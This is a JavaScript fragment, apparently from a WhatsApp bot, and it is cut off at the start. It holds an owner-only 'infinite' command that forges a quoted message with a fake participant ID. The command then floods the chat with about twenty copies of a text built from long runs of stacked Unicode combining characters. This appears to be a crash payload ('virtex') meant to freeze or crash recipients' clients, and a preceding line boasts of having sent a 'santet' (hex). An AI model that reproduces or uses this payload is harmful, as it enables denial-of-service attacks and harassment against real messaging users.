            m.reply(`BERHASIL MENGIRIM SANTET`)
            break
                    case 'infinite':               
          if (!isCreator) return
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
